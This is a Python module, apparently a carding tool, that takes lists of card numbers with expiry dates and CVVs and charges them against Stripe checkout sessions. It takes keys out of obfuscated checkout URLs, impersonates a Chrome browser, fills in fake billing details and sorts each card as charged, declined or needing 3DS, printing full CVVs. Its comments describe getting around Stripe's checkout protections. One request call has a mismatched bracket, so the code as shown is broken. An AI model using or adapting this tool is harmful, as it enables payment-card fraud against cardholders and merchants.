# language: Python 3.10+, file: stripe_core.py
import os
import re
import json
import time
import base64
import urllib.parse
import random
import asyncio
from typing import Dict, Optional

class C:
    R = "\033[0m"
    B = "\033[1m"
    RED = "\033[91m"
    LIME = "\033[92m"
    GOLD = "\033[93m"
    CYN = "\033[96m"

def log(msg, color=C.R):
    print(f"{color}[{time.strftime('%H:%M:%S')}] {msg}{C.R}")

def parse_card(text: str) -> Optional[Dict[str, str]]:
    parts = re.split(r'[|/\\\s,]+', text.strip())
    if len(parts) < 4:
        return None
    cc = re.sub(r'\D', '', parts[0])
    if not 15 <= len(cc) <= 19:
        return None
    mm = parts[1].strip().zfill(2)
    if not mm.isdigit() or not 1 <= int(mm) <= 12:
        return None
    yy = parts[2].strip()
    if len(yy) == 2:
        yy = "20" + yy
    if not yy.isdigit() or len(yy) != 4:
        return None
    cvv = re.sub(r'\D', '', parts[3])
    if len(cvv) not in (3, 4):
        return None
    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}

class StripeSession:
    def __init__(self, target_url: str):
        self.url = target_url.strip()
        self.pk = ""
        self.cs = ""
        self.acct = ""
        self.amount = 100
        self.currency = "USD"
        self.merchant_name = "Stripe Merchant"
        self.session = None

    def _decode_fid(self, fragment: str) -> Optional[dict]:
        try:
            raw = urllib.parse.unquote(fragment.strip()).rstrip('%')
            pad = raw + "=" * (-len(raw) % 4)
            if '-' in pad or '_' in pad:
                pad = pad.translate(str.maketrans('-_', '+/'))
            decoded = base64.b64decode(pad, validate=True)
            xored = bytes(b ^ 5 for b in decoded).decode("utf-8", errors="ignore")
            data = json.loads(xored.strip())
            return data if isinstance(data, dict) else None
        except:
            return None

    async def prefetch(self) -> tuple[bool, str]:
        try:
            no_frag = self.url.split('#')[0]
            m_cs = re.search(r'(cs_(?:live|test)_[A-Za-z0-9]{20,})', no_frag)
            if m_cs:
                self.cs = m_cs.group(1)

            if '#' in self.url:
                frag = self.url.split('#', 1)[1].split('?')[0]
                fid = self._decode_fid(frag)
                if fid:
                    for k in ['apiKey', 'publishableKey', 'pk']:
                        if fid.get(k, '').startswith('pk_'):
                            self.pk = fid[k]
                            break
                    for k in ['stripeAccount', 'stripe_account', 'account']:
                        if fid.get(k, '').startswith('acct_'):
                            self.acct = fid[k]
                            break

            if not self.pk:
                m_pk = re.search(r'(pk_(?:live|test)_[a-zA-Z0-9]+)', self.url)
                if m_pk:
                    self.pk = m_pk.group(1)

            if not self.pk or not self.cs:
                return False, "لم يتم العثور على مفاتيح PK أو CS في الرابط."

            import curl_cffi.requests as cffi
            # استخدام إعدادات تتناسب مع بيئة Horus وتجنب انقطاع الـ SSL
            self.session = cffi.AsyncSession(impersonate="chrome110", verify=False)
            ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'

            # جلب معلومات الجلسة مباشرة بدون الحاجة لـ m.stripe.com لتفادي أخطاء الـ SSL
            init_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://checkout.stripe.com',
                'referer': f'https://checkout.stripe.com/c/pay/{self.cs}',
                'user-agent': ua,
                'stripe-version': '2020-08-27'
            }
            if self.acct:
                init_headers['stripe-account'] = self.acct

            init_data = {
                'key': self.pk, 'eid': 'NA', 'browser_locale': 'en-US',
                'browser_timezone': 'America/New_York', 'redirect_type': 'url'
            }

            r_init = await self.session.post(
                f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                data=init_data,
                headers=init_headers,
                timeout=15
            }
            d = r_init.json() or {}
            if d.get('error'):
                return False, d['error'].get('message', 'Init error')

            acct_set = d.get('account_settings') or {}
            if acct_set.get('display_name'):
                self.merchant_name = acct_set['display_name']

            lig = d.get('line_item_group') or {}
            inv = d.get('invoice') or {}
            pi = d.get('payment_intent') or {}
            
            total = None
            if lig.get('localized_prices_metas'):
                for m in lig['localized_prices_metas']:
                    if isinstance(m, dict) and m.get('currency') == 'usd' and m.get('total', 0) > 0:
                        total = int(m['total'])
                        break
            if total is None:
                for f in ['total', 'due', 'subtotal']:
                    if lig.get(f) and int(lig[f]) > 0:
                        total = int(lig[f])
                        self.currency = str(lig.get('currency', 'USD')).upper()
                        break
            if total is None:
                for f in ['amount_due', 'total']:
                    if inv.get(f) and int(inv[f]) > 0:
                        total = int(inv[f])
                        self.currency = str(inv.get('currency', 'USD')).upper()
                        break
            if total is None and pi.get('amount'):
                total = int(pi['amount'])
                self.currency = str(pi.get('currency', 'USD')).upper()

            self.amount = total if total else 100
            return True, ""
        except Exception as e:
            return False, str(e)

    async def charge(self, card_dict: dict) -> dict:
        t0 = time.time()
        cc = card_dict["cc"]
        mm = card_dict["mm"]
        yy = card_dict["yy"]
        cvv = card_dict["cvv"]
        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'

        try:
            # استخدام واجهة Standard Payment Methods للتغلب على حماية Checkout Surface Unsupported
            tok_body = {
                'type': 'card',
                'card[number]': cc, 'card[cvc]': cvv, 'card[exp_month]': mm, 'card[exp_year]': yy,
                'billing_details[address][country]': 'US',
                'billing_details[address][postal_code]': '10001',
                'payment_user_agent': 'stripe.js/v3; stripe-js-v3/v3',
                'key': self.pk
            }
            
            tok_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua,
                'stripe-version': '2020-08-27'
            }
            if self.acct:
                tok_headers['stripe-account'] = self.acct

            r_tok = await self.session.post(
                'https://api.stripe.com/v1/payment_methods',
                data=tok_body,
                headers=tok_headers,
                timeout=12
            )
            td = r_tok.json() or {}
            if td.get('error'):
                err_obj = td['error']
                return {
                    "status": "DECLINED",
                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                    "amount": f"{self.currency} {self.amount/100:.2f}",
                    "response_time": time.time() - t0,
                    "message": err_obj.get('message', 'Card Declined')
                }

            pm_id = td.get('id')
            if not pm_id:
                return {"status": "DECLINED", "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}", "amount": f"{self.currency} {self.amount/100:.2f}", "response_time": time.time() - t0, "message": "Failed to create Payment Method"}

            confirm_body = {
                'key': self.pk,
                'payment_method': pm_id,
                'expected_payment_method_type': 'card',
                'expected_amount': str(self.amount),
                'return_url': "https://checkout.stripe.com/return",
                'client_attribution_metadata[client_session_id]': self.cs,
            }

            r_conf = await self.session.post(
                f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm",
                data=confirm_body,
                headers=tok_headers,
                timeout=20
            )
            resp = r_conf.json() or {}
            
            if resp.get('error'):
                err_obj = resp['error']
                err_msg = err_obj.get('message', 'Declined')
                code = str(err_obj.get('code', '')).lower()
                status = "DECLINED"
                if "authentication" in err_msg.lower() or "3d" in err_msg.lower() or code == "authentication_required":
                    status = "REQUIRES_ACTION"
                return {
                    "status": status,
                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                    "amount": f"{self.currency} {self.amount/100:.2f}",
                    "response_time": time.time() - t0,
                    "message": err_msg
                }

            pi = resp.get('payment_intent') or resp.get('setup_intent') or resp or {}
            pi_status = str(pi.get('status') or '')

            if pi_status in ("succeeded", "complete", "requires_capture"):
                return {
                    "status": "CHARGED",
                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                    "amount": f"{self.currency} {self.amount/100:.2f}",
                    "response_time": time.time() - t0,
                    "message": "تم خصم المبلغ بنجاح ✅"
                }
            elif pi_status in ("requires_action", "requires_source_action") or pi.get("next_action"):
                return {
                    "status": "REQUIRES_ACTION",
                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                    "amount": f"{self.currency} {self.amount/100:.2f}",
                    "response_time": time.time() - t0,
                    "message": "تتطلب مصادقة 3DS / OTP 🔐"
                }
            else:
                return {
                    "status": "DECLINED",
                    "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                    "amount": f"{self.currency} {self.amount/100:.2f}",
                    "response_time": time.time() - t0,
                    "message": f"الحالة: {pi_status or 'Declined'}"
                }

        except Exception as e:
            return {
                "status": "ERROR",
                "card": f"{cc[:6]}****{cc[-4:]}|{mm}|{yy}|{cvv}",
                "amount": f"{self.currency} {self.amount/100:.2f}",
                "response_time": time.time() - t0,
                "message": str(e)[:100]
            }

    async def close(self):
        if self.session:
            try:
                await self.session.close()
            except:
                pass
